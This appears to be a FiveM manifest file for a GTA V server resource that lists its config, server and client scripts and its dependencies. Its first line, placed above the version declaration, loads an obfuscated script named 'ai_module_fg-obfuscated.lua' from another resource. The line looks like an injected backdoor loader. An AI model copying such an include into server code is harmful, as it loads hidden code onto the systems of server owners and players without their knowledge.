shared_script '@lrp-blips/ai_module_fg-obfuscated.lua'
fx_version 'cerulean'
game 'gta5'



shared_script 'config.lua'
server_script {
	'server/main.lua',
	'@oxmysql/lib/MySQL.lua'
}
client_script {
	'@PolyZone/client.lua',
	'@PolyZone/BoxZone.lua',
	'client/main.lua'
}



lua54 'yes'